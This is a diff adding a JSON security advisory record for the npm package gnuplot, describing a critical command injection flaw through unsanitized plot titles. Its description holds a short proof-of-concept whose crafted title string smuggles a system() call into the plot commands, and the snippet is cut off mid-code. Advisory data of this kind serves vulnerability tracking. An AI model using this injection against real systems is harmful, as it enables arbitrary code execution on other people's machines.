@@ -1,0 +1,28 @@
+{
+  "packageName": "gnuplot",
+  "lastUpdated": "2026-05-04T13:06:56.926Z",
+  "vulnerabilities": [
+    {
+      "id": "GHSA-cfwc-xjfp-44jg",
+      "packageName": "gnuplot",
+      "title": "Command Injection in gnuplot",
+      "description": "All versions of `gnuplot` are vulnerable to Command Injection. The package fails to sanitize plot titles, which may allow attackers to execute arbitrary code in the system if the title value is supplied by a user. The following proof-of-concept creates a `testing` file in the current directory:\n\n```\nvar gnuplot = require('gnuplot');\n\nconst title = '\"\\nset title system(\"touch testing\")\\n#';\n\ngnuplot()\n.set('term png')\n.set('output \"out.png\"')\n.set(`title \"${title}\"`)\n.set('xrange [-10:10]')\n.set(",
+      "severity": "critical",
+      "url": "https://github.com/advisories/GHSA-cfwc-xjfp-44jg",
+      "publishedAt": "2020-09-04T17:19:48Z",
+      "modifiedAt": "2023-01-09T05:03:52Z",
+      "identifiers": [
+        {
+          "type": "GHSA",
+          "value": "GHSA-cfwc-xjfp-44jg"
+        }
+      ],
+      "affectedVersions": [
+        {
+          "range": ">= 0.0.0"
+        }
+      ],
+      "source": "github"
+    }
+  ]
+}
